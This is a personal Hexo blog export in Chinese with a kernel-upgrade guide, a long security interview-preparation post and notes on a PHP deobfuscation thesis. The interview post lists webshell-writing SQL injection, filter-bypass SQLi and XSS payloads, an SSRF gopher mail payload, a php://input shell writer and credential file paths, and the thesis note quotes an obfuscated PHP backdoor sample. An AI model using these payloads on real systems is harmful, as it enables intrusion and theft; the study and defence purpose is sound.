{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2022-01-28T03:36:25.000Z","updated":"2022-01-28T03:36:25.402Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"links","date":"2022-01-28T03:37:00.000Z","updated":"2022-01-28T03:37:00.466Z","comments":true,"path":"links/index.html","permalink":"http://example.com/links/index.html","excerpt":"","text":""}],"posts":[{"title":"Ubuntu 20.04更新内核到指定版本","slug":"Ubuntu20.04 升级降级内核到指定版本","date":"2022-03-28T08:40:40.000Z","updated":"2022-03-28T08:49:35.749Z","comments":true,"path":"2022/03/28/Ubuntu20.04 升级降级内核到指定版本/","link":"","permalink":"http://example.com/2022/03/28/Ubuntu20.04%20%E5%8D%87%E7%BA%A7%E9%99%8D%E7%BA%A7%E5%86%85%E6%A0%B8%E5%88%B0%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/","excerpt":"记一次更新内核到5.8.0-33-generic","text":"记一次更新内核到5.8.0-33-generic 更新到指定版本查看当前版本123456789$ uname -r4.15.0-101-generic$ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 20.04 LTSRelease: 20.04Codename: focal 查看当前已经安装的 Kernel Image1234$ dpkg --get-selections |grep linux-imagelinux-image-5.4.0-90-generic purgelinux-image-5.8.0-33-generic installlinux-image-generic install 查询当前软件仓库可以安装的 Kernel Image 版本，如果没有预期的版本，则需要额外配置仓库1$ apt-cache search linux | grep linux-image 安装指定版本的 Kernel Image 和 Kernel Header1$ sudo apt-get install linux-headers-5.8.0-33-generic linux-image-5.8.0-33-generic 查看当前的Kernel列表1234567891011$ grep menuentry /boot/grub/grub.cfgif [ x&quot;$&#123;feature_menuentry_id&#125;&quot; = xy ]; then menuentry_id_option=&quot;--id&quot; menuentry_id_option=&quot;&quot;export menuentry_id_optionmenuentry &#x27;Ubuntu&#x27; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option &#x27;gnulinux-simple-b986dc3b-6b82-44d5-acb8-6cbad5e357d5&#x27; &#123;submenu &#x27;Advanced options for Ubuntu&#x27; $menuentry_id_option &#x27;gnulinux-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5&#x27; &#123; menuentry &#x27;Ubuntu, with Linux 5.8.0-33-generic&#x27; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option &#x27;gnulinux-5.8.0-33-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5&#x27; &#123; menuentry &#x27;Ubuntu, with Linux 5.8.0-33-generic (recovery mode)&#x27; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option &#x27;gnulinux-5.8.0-33-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5&#x27; &#123; menuentry &#x27;Ubuntu, with Linux 5.4.0-90-generic&#x27; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option &#x27;gnulinux-5.4.0-90-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5&#x27; &#123; menuentry &#x27;Ubuntu, with Linux 5.4.0-90-generic (recovery mode)&#x27; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option &#x27;gnulinux-5.4.0-90-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5&#x27; &#123; 修改 Kernel 的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改 grub 配置1234$ sudo vim /etc/default/grub# GRUB_DEFAULT=0GRUB_DEFAULT=&quot;Advanced options for Ubuntu&gt;Ubuntu, with Linux 5.8.0-33-generic&quot; 生效配置12$ update-grub$ reboot 删除不需要的Kernel查询不包括当前内核版本的其它所有内核版本12$ dpkg -l | tail -n +6| grep -E &#x27;linux-image-[0-9]+&#x27;| grep -Fv $(uname -r)pi linux-image-5.4.0-90-generic 5.4.0-90.101 amd64 Signed kernel image generic Kernel 状态： rc：表示已经被移除 ii：表示符合移除条件（可移除） iU：已进入 apt 安装队列，但还未被安装（不可移除） 删除指定的Kernel1dpkg --purge linux-image-5.4.0-90-generic","categories":[],"tags":[{"name":"Kernel","slug":"Kernel","permalink":"http://example.com/tags/Kernel/"}]},{"title":"信安面试问题准备","slug":"面试准备","date":"2022-03-24T16:00:00.000Z","updated":"2022-03-28T08:49:51.545Z","comments":true,"path":"2022/03/25/面试准备/","link":"","permalink":"http://example.com/2022/03/25/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/","excerpt":"收集一些常见的信息安全面试问题","text":"收集一些常见的信息安全面试问题 信息收集假如给你一个网站你怎么去渗透1234567891011121314151617信息收集首先看是什么类型的网站，针对不同类型的网站有不同的信息搜集方案，如大型企业网站可以用天眼查，启信宝等查询法人股份等信息，小型网站可以查询使用了哪类建站系统1.whois查詢,获取注册者邮箱姓名电话等。2.查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。3.查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞4.查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,訫脏滴血，mysql,ftp,ssh弱口令等。5.扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针6.google hack进一步探测网站的信息，后台，敏感文件7.查看这个网站都有哪些功能，针对不同的功能可以实现不同的漏洞利用 whois查詢主要查的是什么?123456789101.域名信息2.注册商3.联系人4.联系邮箱5.网站创建时间6.网站过期时间7.DNS信息8.网站状态拓展：什么是whois？whois可以理解为域名数据库搜索引擎 nmap命令123456789-p 加端口号或1-65535-sS (TCP SYN扫描)-sT (TCP connect()扫描)-sU (UDP扫描)-sV (版本探测)-O (启用操作系统检测)-f (报文分段); --mtu (使用指定的MTU)-D &lt;decoy1 ，decoy2，...&gt; (使用诱饵隐蔽扫描)-S &lt;IP_Address&gt; (源地址哄骗) 常见的web容器1234567WebLogicWebSphereJBossTomcatIISApacheNginx 常见中间件漏洞1234567891011121314151617181920212223242526271.IIS 1、PUT 漏洞 2、短文件名猜解 3、远程代码执行 4、解析漏洞2.Apache 1、解析漏洞 2、目录遍历3.Nginx 1、文件解析 2、目录遍历 3、CRLF 注入 4、目录穿越4.Tomcat 1、远程代码执行 2、war 后门文件部署5.jBoss 1、反序列化漏洞 2、war 后门文件部署6.WebLogic 1、反序列化漏洞 2、SSRF 3、任意文件上传 4、war 后门文件部署7.其它中间件相关漏洞 1、FastCGI 未授权访问、任意命令执行 2、PHPCGI 远程代码执行 常见端口及对应服务1 SQL注入SQL和NoSQL的优缺点1234SQL 优点：结构稳定、逻辑性强、易于理解SQL 缺点：不适于高并发、不适于海量数据高效读写、维护开销大、相对 nosql 速度慢NoSql 优点：易扩展、数据结构灵活、查询速度快比较：没有好坏之分，只看应用环境。关系型数据库可靠性更强、适用于银行等数据精度要求高的环境。非关系型数据库适用于高并发、大量数据库交互、数据准确度不高的环境。 常见数据库端口1234567891011关系型： mysql:3306 sqlserver:1433 orecal:1521 PostgreSQL:5432 db2:50000非关系型： MongoDB:27017 redis:6379 memcached:11211 SQL注入的分类12345678910111213141516从注入参数类型分： 数字型注入 字符型注入 搜索型注入从注入方法分： 基于报错 基于布尔盲注 基于时间盲注 联合查询 堆叠注入 宽字节注入从提交方式分： GET注入 POST注入 COOKIE注入 HTTP头注入 load_file判断是否有读写权限12and (select count(*) from mysql.user)&gt;0/* 如果结果返回正常,说明具有读写权限。and (select count(*) from mysql.user)&gt;0/* 返回错误，应该是管理员给数据库帐户降权 mysql5.0上下有什么区别1mysql5.0以下版本没有information_schema这个系统库，无法列出表名列名，只能暴力跑 MySQL中@和@@的区别12一个@是用户自定义变量两个@是系统变量，如@@version、@@user MySQL绕过常用函数12345group_concat() ==&gt; concat_ws()sleep() ==&gt; benchmark()mid()、substr() ==&gt; substring()user() ==&gt; @@userupdatexml() ==&gt; extractvalue() SQL注入的危害和修复123456造成敏感信息泄漏，攻击者可以对表数据进行操作。如果有写权限，可以写入木马，可能被getshell。或者被提权修复方案： sql语句预编译 对输入内容进行转义 使用安全函数 SQL注入写入webshell的条件和方式123456789101112131415161718192021条件： 要知道网站绝对路径，可以通过报错，phpinfo界面，404界面等一些方式知道 gpc没有开启，开启了单引号被转义了，语句就不能正常执行了 要有file权限，默认情况下只有root有 对目录要有写权限，一般image之类的存放突破的目录就有 方式： 1；union写入 union select into outfile，将一句话写入shell.php，仅适用于联合注入 具体权限要求：secure_file_priv支持web目录文件导出、数据库用户File权限、获取物理路径。 ?id=1 union select 1,&quot;&lt;?php @eval($_POST[&#x27;g&#x27;]);?&gt;&quot;,3 into outfile &#x27;E:/study/WWW/evil.php&#x27; 2.分隔符写入 当Mysql注入点为盲注或报错，Union select写入的方式显然是利用不了的，那么可以通过分隔符写入。SQLMAP的 --os-shell命令，所采用的就是一下这种方式 具体权限要求：secure_file_priv支持web目录文件导出、数据库用户File权限、获取物理路径。 ?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines terminated by （一句话hex编码）# ?id=1 INTO OUTFILE &#x27;物理路径&#x27; fields terminated by （一句话hex编码）# ?id=1 INTO OUTFILE &#x27;物理路径&#x27; columns terminated by （一句话hex编码）# ?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines starting by （一句话hex编码）# 3.log写入 新版本的MySQL设置了导出文件的路径，很难在获取Webshell过程中去修改配置文件，无法通过使用select into outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell。 具体权限要求：数据库用户需具备Super和File服务器权限、获取物理路径。 sql注入过滤了逗号123456789/*1.join绕过*/union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),&#x27; &#x27;,database(),&#x27; &#x27;,@@datadir))D);/*2.对于mid()和substr()函数，可以使用from for*/select substr(database() from 1 for 1);select mid(database() from 1 for 1);/*3.对于limit可以用offset*/limit 0,1 ==&gt; limit 1 offset 0 sleep被禁用后还能怎么进行sql注入（延时函数都有哪些？）12345678/*1.benchmark代替sleep*/id=1 and if(ascii(substring((database()),1,1))=115,(select benchmark(10000000,md5(0x41))),1) --+/*2.笛卡尔积盲注*/select * from ctf_test where user=&#x27;1&#x27; and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C)/*3.RLIKE盲注*/select * from flag where flag=&#x27;1&#x27; and if(mid(user(),1,1)=&#x27;r&#x27;,concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd&#x27;,1) Select被过滤怎么办123456sel&lt;&gt;ectsele/**/ct/*!%53eLEct*/se%0blectREVERSE(tceles)%53eLEct 盲注关键的表被过滤了，该怎么办1234567如果关键的表被禁用了，可以使用这种形式select count(*) from (select 1 union select null unionselect !1) group by concat(version(),floor(rand(0)*2))如果 rand 被禁用了可以使用用户变量来报错select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2) sql注入常见的过WAF方法1234567内联注释绕过填充大量脏数据绕过垃圾参数填充绕过改变提交方式绕过,如GET方式变为POST方式提交随机agent头绕过fuzz过滤函数函数替换绕过 Mysql UDF提权12345678原理： UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。 条件： 如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\\plugin文件夹下/ 如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\\windows\\system32目 录，在windows server 2000下放置在c:\\winnt\\system32目录。 掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。 拥有可以将udf.dll写入相应目录的权限。 SQL注入如何判断不同数据库12345678910111213141516171.注释符判断/是 MySQL 中的注释符，返回错误说明该注入点不是 MySQL；继续提交如下查询字符：–是 Oracle 和 MSSQL 支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符：;是子句查询标识符，Oracle 不支持多行查询，因此如果返回错误，则说明很可能是 Oracle 数据库。2.函数判断and (select count()from MSysAccessObjects)&gt;0 access 数据库and (select count()from sysobjects)&gt;0 返回正常说明是 mssql 数据库and length(user())&gt;10 返回正常说明是 MysqlOracle 可以根据 from dual 虚拟库判断3.根据语言和中间件常识Asp 和.net 通常使用 sqlserverPhp 通常使用 mysql 或者 postgresqlJava 通常是 oracle 或 mysqlIIS 服务器是基于 windows 的架构，后台数据库有可能是 sqlserverApache 服务器，可能使用开源数据库 mysql 或 postgresql 预编译是否100%能防御SQL注入12345678910预编译原理：先将查询语句固定通过函数将传参变为字符串拼接字符串去执行你的关键字根本不会当作关键字去执行$pdo-&gt;query(‘SET NAMES gbk’);$var = “\\xbf\\x27 OR 1=1 /“;$query = ‘SELECT FROM test WHERE name = ? LIMIT 1’;$stmt = $pdo-&gt;prepare($query);$stmt-&gt;execute(array($var)); 类似于宽字节注入 发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell123456(1)有写入权限的，构造联合查询语句使用 using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell(2)使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高(3)通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell XSSXSS的分类1234561.反射型 发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。2.存储型 存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。（例如：常见的评论，在文本框中输入一段代码，那么就会存放在数据库当中，当再次加载的时候便会执行这样的代码）3.DOM型XSS 如何预防XSS1234过滤一些危险字符，以及转义&amp; &lt; &gt; &quot; &#x27; /等危险字符HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。设置CSP(Content Security Policy)输入内容长度限制 XSS和CSRF、SSRF的区别12345相同：三种Web服务端漏洞均是服务器对用户提供的可控数据过于信任或过滤不严导致的不同： XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回前端页面出现了预期之外的脚本语句执行 CSRF是服务器没对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者利用用户cookie信息伪造用户请求发送至服务器 SSRF是服务器对用户提交的可控URL过于信任，没有对攻击者提供的url进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器 除了alert函数，还可以使用哪些函数弹窗1prompt(),confirm() 绕过方法12345678910111213141516171.过滤空格： 用/代替空格2.关键字过滤： 双写绕过 大小写绕过 字符串拼接：&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;&gt; 编码绕过 Unicode编码绕过：&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt; URL编码绕过：&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt; ascii码绕过：&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt; base64绕过：&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;3.过滤单双引号 编码绕过 使用反引号：&lt;img src=&quot;x&quot; onerror=alert(`xss`);&gt;4.其他 使用中文标点 使用IP CSRF什么是CSRF1攻击者盗用了你的身份信息，以你的名义发送恶意请求，对服务器来说这个请求是你发起的，却完成了攻击者所期望的一个操作 CSRF的预防123451.当用户发送重要的请求时输入验证码2.涉及随机TOKEN ---数据包的唯一值3.检测referer来源，请求时判断请求连接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）4.设置验证码5.限制请求方式只能为post0 SSRFSSRF形成的原因1SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 SSRF绕过1234567891011121314151617181920212223241.使用Enclosed alphanumerics编码2.[::]绕过3.@example绕过 http://example.com@127.0.0.14.127.0.0.1 =&gt; 127.1 =&gt; http://0/5.短域名绕过6..xip.io绕过7.IP进制转换8.利用句号 127。0。0。1 =&gt; 127.0.0.19.利用协议 Dict:// dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt; ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php? url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a SSRF的利用方式12345671.让服务端去访问相应的网址2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包&#123;payload&#125;）5.攻击内网应用程序（利用跨协议通信技术）6.判断内网主机是否存活：方法是访问看是否有端口开放7.DoS攻击（请求大文件，始终保持连接keep-alive always） SSRF预防1234561.禁止跳转2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）5.限制请求的端口为http常用的端口，比如 80、443、8080、80906.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 XXE越权漏洞水平越权和垂直越权l12345水平越权： 水平越权通常是获得同级别用户的权限，可以访问到同级别用户的数据垂直越权： 垂直越权又叫权限攻击，是获得高于自己当权角色权限的账户的权限。 越权漏洞通常出现的位置1234订单界面修改用户信息界面用户信息查询界面等通过ID或者文件名等参数进行交互的地方 越权漏洞预防措施12345前后端同时对用户输入信息进行校验，双重验证机制调用功能前验证用户是否有权限调用相关功能执行关键操作验证用户身份，验证是否有操作数据的权限直接对象引用的资源ID，防止攻击者枚举ID，敏感数据特殊化处理对可控参数进行严格的检查和过滤 文件上传常用绕过手法12345678910111213141516171819202122232425262728293031323334客户端 js检查服务端 检查后缀 黑名单 上传特殊可解析后缀 上传.htaccess 上传.user.ini 后缀大小写绕过 点绕过 空格绕过 ::$DATA配合解析漏洞 Apache HTTPD 换行解析漏洞（CVE-2017-15715） Apache HTTPD 多后缀解析漏洞 Nginx 解析漏洞 IIS7.5解析漏洞 IIS6解析漏洞 双后缀名绕过 白名单 MIME绕过 %00截断 0x00截断（白名单、上传路径可控、php.ini中的magic_quotes_gpc为off） 0x0a截断（php版本&lt;5.3.4、php.ini中的magic_quotes_gpc设置为off、上传路径可控、白名单） 检查内容 文件头检查 突破getimagesize() 突破exif_imagetype() 二次渲染 其他 条件竞争 PHP爆绝对路径的方法123456单引号爆路径错误参数值爆路径Google 爆路径:Site:xxx.edu.tw warning测试文件爆路径（test.php、1.php、ceshi.php、info.php）phpmyadmin 爆路径:/phpmyadmin/libraries/lect_lang.lib.php配置文件找路径 文件包含PHP中文件包含函数及其特点12345678require()require_once()include()include_once()include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题 常见的敏感信息路径12345678910111213141516Windows系统c:\\boot.ini // 查看系统版本c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码c:\\ProgramFiles\\mysql\\my.ini // MySQL配置c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码c:\\windows\\php.ini // php 配置信息Linux/Unix系统/etc/passwd // 账户信息/etc/shadow // 账户密码文件/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置/usr/local/app/php5/lib/php.ini // PHP相关配置/etc/httpd/conf/httpd.conf // Apache配置文件/etc/my.conf // mysql 配置文件 session文件包含漏洞12345利用条件：1.session的存储位置可以获取 可以通过phpinfo查看 可以进行猜测路径，如linux下默认存储在/var/lib/php/session目录下2.session中的内容可以被控制，传入恶意代码 文件包含常用绕过12345678%00截断绕过 magic_quotes_gpc = Off php版本&lt;5.3.4路径长度截断 windows OS，点号需要长于256；linux OS 长于4096./绕过去后缀名绕过问号绕过#号绕过 PHP伪协议123456789101.php://filter（本地磁盘文件进行读取） 用法：?filename=php://filter/convert.base64-encode/resource=xxx.php2.php://input （读取POST数据） 用法：POST写入木马&lt;?PHP fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;3.file://伪协议 （读取文件内容） 用法：file://c:/boot.ini4.data://(读取文件) 用法：data://text/plain;base64,SSBsb3ZlIFBIUAo=5.phar://（压缩文件读取） 用法：?file=phar://压缩包/内部文件 命令执行常见危险函数12代码执行函数：eval、assert、call_user_func、create_function、array_map命令执行函数：system、passthru、exec、pcntl_exec、shell_exec、popen() 修复方案123456781.尽量少用执行命令的函数或者直接禁用2.参数值尽量使用引号包括3.在使用动态函数之前，确保使用的函数是指定的函数之一4.在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义5.能使用脚本解决的工作，不要调用其他程序处理。尽量少用执行命令的函数，并在disable_functions中禁用6.对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤，对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤7.参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义而针对由特定第三方组件引发的漏洞，我们要做的就是及时打补丁，修改安装时的默认配置。 常见web漏洞原理、防御办法1234567891011121314151617181920212223242526272829303132333435363738394041424344451.SQL注入 原理：数据与代码未分离 防御： waf 使用预编译语句，绑定变量 检查数据类型，例如限制输入数据只能为int 使用安全函数,encodeForSQL() 最小权限原则，避免直接使用root2.XSS 原理： 防御： 在Cookie中设置HttpOnly标识,禁止页面的js访问带有httponly属性的cookie XSS Filter：过滤用户输入的危险字符，设置黑白名单 输出检查：编码和转义，常用编码：html编码、url编码、js编码、16进制、base64等，使得浏览器无法解析执行js代码 针对不同位置的输出，使用不同的处理方式 处理富文本:限制用户能使用的标签，限制为只能使用a、div等安全的标签 header中使用content-Sencurity-Policy字段，规定请求js的域名白名单（CSP策略）3.CSRF 原理：通过伪装来自受信任用户的请求来利用受信任的网站,例如：用户登录某账户，浏览器获得cookie；攻击者诱使用户访问某构造好的恶意CSRF页面。 防御： 验证码 Referer Check（HTTPS跳转到HTTP不会发送Referer） Anti CSRF Token4.SSRF 原理：利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制，一般用来在外网探测或攻击内网服务 防御： 对url参数进行过滤，过滤返回信息 限制请求端口为http常用的端口 内网IP黑名单 禁用不需要的协议5.XXE 原理：应用程序解析XML输入时，没有禁止DTD引用外部实体的加载，导致可加载恶意外部文件 防御： 使用开发语言提供的禁用外部实体的方法 过滤用户提交的XML数据，过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。6.文件上传 原理：没有对上传文件进行过滤导致用户可以上传shell 防御： 文件扩展名服务端白名单校验。 文件内容服务端校验。 上传文件重命名。 隐藏上传文件路径。 文件上传的目录设置为不可执行 单独设置文件服务器的域名 1234567891011121314151617181920212223242526271.IIS 6.x 解析漏洞 .asp文件夹下的文件会解析为asp .asp;.jpg文件会被解析为asp 7.x 解析漏洞 .jpg后加上/.php会将jpg文件解析为php PUT任意文件写入 开启WevDav之后如果有写入权限会造成任意文件写入 短文件名猜解2.Apache 未知后缀解析漏洞 .php.xxx1.xxx2，从右往左解析 后缀换行漏洞 1.php/%0A会被解析为php ADDhandle配置错误 配置处理器3.Nginx 配置错误导致解析漏洞/.php 空字符任意命令执行 文件名逻辑漏洞 文件名后加空格 配置错误 目录穿越:配置alias的时候没有/ 目录遍历：autoindex=o LR注入漏洞：url解析换行4.tomcat 弱口令 远程代码执行：函数在windows上和linux的实现不同","categories":[],"tags":[{"name":"面经","slug":"面经","permalink":"http://example.com/tags/%E9%9D%A2%E7%BB%8F/"}]},{"title":"PHP_Deobf源码分析","slug":"PHP_deobf源码分析","date":"2022-02-22T03:47:47.000Z","updated":"2022-02-22T03:48:00.865Z","comments":true,"path":"2022/02/22/PHP_deobf源码分析/","link":"","permalink":"http://example.com/2022/02/22/PHP_deobf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"分析一下毕设的参考项目于源码","text":"分析一下毕设的参考项目于源码 PHP_deobf源码分析因为毕设主要依托于这个(不是直接down了交嗷) 所以近期要分析一下这个项目对于各种混淆的处理方式","categories":[],"tags":[{"name":"安全开发","slug":"安全开发","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"},{"name":"源码分析","slug":"源码分析","permalink":"http://example.com/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"name":"毕业设计","slug":"毕业设计","permalink":"http://example.com/tags/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/"}]},{"title":"W9scan源码分析","slug":"W9scan源码分析","date":"2022-02-22T03:45:45.000Z","updated":"2022-02-22T03:46:42.505Z","comments":true,"path":"2022/02/22/W9scan源码分析/","link":"","permalink":"http://example.com/2022/02/22/W9scan%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"分析漏洞扫描器W9scan的源码，准备入坑安全开发？？","text":"分析漏洞扫描器W9scan的源码，准备入坑安全开发？？ W9scan源码分析目前准备稍微入坑一下Python安全开发，准备从w9scan的源码入手开始学习，这个用来记录源码学习","categories":[],"tags":[{"name":"安全开发","slug":"安全开发","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"},{"name":"源码分析","slug":"源码分析","permalink":"http://example.com/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"}]},{"title":"毕设项目:基于PHP-Parser进行反混淆与检测的规划","slug":"毕业设计の想法","date":"2022-02-10T12:00:00.000Z","updated":"2022-02-11T03:29:32.896Z","comments":true,"path":"2022/02/10/毕业设计の想法/","link":"","permalink":"http://example.com/2022/02/10/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1%E3%81%AE%E6%83%B3%E6%B3%95/","excerpt":"对于自己的毕设的一些功能的想法和未来该怎么做的一些规划","text":"对于自己的毕设的一些功能的想法和未来该怎么做的一些规划 毕设项目-基于PHP-Parser的反混淆前言大致设想是使用PHP-Parser完成反混淆，然后结合Yara进行检测。 目前是没考虑过机器学习，后续可能会使用吧(maybe 反混淆PHP-Parser基础来源于FeatureExtract中积累的操作 根据Github上的反混淆项目和Deof项目进行改造，尽量理解两个项目的运行方式以及对待不同混淆时的操作 Deobf编写比较有逻辑，整体框架一目了然，对应文件的功能比较清晰 但是现在功能不够全，对于一些情况目前无法处理，比如 123456789101112&lt;?php $z0=$_REQUEST[&#x27;sort&#x27;];$q1=&#x27;&#x27;;$c2=&quot;wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2&quot;;$y3=array(8,38,15,7,6,4,26,25,7,34,24,25,7);foreach($y3 as $h4) &#123; $q1.=$c2[$h4];&#125;$v5=strrev(&quot;noi&quot;.&quot;tcnuf&quot;.&quot;_eta&quot;.&quot;erc&quot;);$j6=$v5(&quot;&quot;,$q1($z0));$j6();?&gt; 在$j6=$v5(&quot;&quot;,$q1($z0));这里不能直接反混淆出v5的值 还有一些其他的功能没有实现，只实现了基础的反混淆，不过因为骨架已经搭好，未来应该在该项目基础上进行编写 